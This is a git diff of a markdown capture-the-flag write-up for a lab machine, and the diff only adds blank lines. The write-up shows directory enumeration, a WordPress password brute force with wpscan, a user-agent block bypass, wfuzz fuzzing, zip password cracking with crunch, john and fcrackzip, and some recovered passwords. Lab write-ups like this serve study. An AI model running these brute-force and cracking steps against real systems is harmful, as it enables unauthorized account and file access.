@@ -19,7 +19,9 @@ Here we can grep responses that dont contain `7` (starting number for default re
 ![a2e1d1919eaeb2eafe036e118baf8669.png](./_resources/d8e09f94168e478f984cd4772525e3b3.png)
 
 `gobuster dir -u http://192.168.196.6 -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -o info.txt`
+
 And here, we can grep responses that dont contain `302`:
+
 ![377c51c3851031d039d6e85244ece65a.png](./_resources/0d2f83f1b7c246b49f043b3c0961e4ab.png)
 
 ![7bcaecbd5080985313ea7d05486faba1.png](./_resources/b6bd04886b8e47c8a11f7288e825d57a.png)
@@ -35,6 +37,7 @@ We tried use it as folder, and bingo!
 
 ### 1.3.3 Wordpress found
 `gobuster dir -u http://192.168.196.6/prehistoricforest/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -f -o info-slash.txt`
+
 ![9bfe5c495ef9258eef2cc20d52f9ff41.png](./_resources/383ccd374d1f4f34b5e8127533321afd.png)
 
 #### 1.3.3.1 Wpscan
@@ -44,9 +47,11 @@ We tried use it as folder, and bingo!
 ![84049290c07b861013556e388cc4bf00.png](./_resources/66f5982a6e574ff49941c2d8e8fd21f5.png)
 
 Tom jr asked a question, and there is a interesting comment:
+
 ![da78716a22383f34f7085f60d4b305c7.png](./_resources/513578f0b1024afab94edce136dae94e.png)
 
 Using `strings` on the image found in the directory mentioned, there is a MD5 hash:
+
 ![b2c81ce84824fe6e342b70aadccdc50b.png](./_resources/a919d8af0b904d54b04b3d5e931c9da9.png)
 `ce154b5a8e59c89732bc25d6a2e6b90b`
 
@@ -54,6 +59,7 @@ Using `strings` on the image found in the directory mentioned, there is a MD5 ha
 `spanky`
 
 Now we can unprotect this page and read it:
+
 ![04be124c8af1ea346819447848200483.png](./_resources/ef24e1635c014fa283bcab2dd3aedabf.png)
 ![b17f52db64eb5d3c35283187e12bc395.png](./_resources/8462515d0f2a4ed3be3d3af3290ea4b9.png)
 
@@ -78,25 +84,31 @@ done
 # 2 Exploitation
 ## 2.1 Brute force with wpscan
 `wpscan --url http://192.168.196.6/prehistoricforest/ -P /root/shared/rockyou.txt -U users.txt -t 100`
+
 ![ec2581a159efe01c8e819d749803ef69.png](./_resources/7eb3eae7a782465ea143e096b39f7c54.png)
 
 ## 2.2 Login as nickburns using simple password
 With the previous tip about logging in to ftp as nickburns, we tried using the username as the password and it works:
+
 ![c1229df1fcb0993b7058f7f90aa4ae57.png](./_resources/fd570b05cbd04ec4bc0492e1416f5845.png)
 ![3fc6379d8ddf9b3d351dc65d5c7dafb3.png](./_resources/38b41202977c469e9f32f732d27a0cd2.png)
 
 ## 2.3 Bypass user-agent based blocking
 Accessing the cited directory, we can't view the content. But there is a message with a tip:
+
 ![69fb23bae6aafb159f8543062f6f1008.png](./_resources/8de5fe233e984be98b14fba3d3bb80bb.png)
 
 Changing the user-agent to another, an iphone's agent, we can view the full content:
+
 https://developers.whatismybrowser.com/useragents/explore/operating_system_name/ios/
 ![0ad5561dd94442f8ffb94f6d764603b0.png](./_resources/11c641314f714585a28da7ec9afb58f3.png)
 Another tip!
 
 ### 2.3.1 Wfuzz enum web content
 `wfuzz -u "http://192.168.196.6/NickIzL33t/FUZZ.html" -w root/shared/rockyou.txt -f info.txt -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) "`
+
 We receveiced a `200` response with different size:
+
 ![77bd6ff06894d3ebe4691322dc304c7e.png](./_resources/e40d8a90d4cc4e4eba00178ea6ca3d22.png)
 
 ### 2.3.2 New file - fallon1.html
@@ -117,10 +129,12 @@ Without success here.
 `crunch 13 13 -t bev,%%@@^1995 > wordlist.txt`
 
 `zip2john t0msp4ssw0rd.zip > hash.hash`
+
 `john hash.hash wordlist.txt`
 
 Or you can user fcrackzip
 `fcrackzip -v -u -D -p wordlist.txt t0msp4ssw0rdz.zip`
+
 ![f4fdee485d2ef94aa40596743d92f818.png](./_resources/247028d5cda1454e8ca9f0be7fbe124e.png)
 bevH00tr$1995
 
@@ -139,6 +153,7 @@ fatguyinalittlecoat1938!!
 # 3 Post-exploitation
 Was used LinEnum.sh to enumerate this Linux, but without good results.
 At this points, the option was manually find writable files due LinEnum.sh don't found the necessary file.
+
 `find / -perm -222 -type d 2>/dev/null`
 
 ![aec84f362889f16aaf0ee1e0de07e0b7.png](./_resources/c8554937aad148669fa7fa6865605902.png)
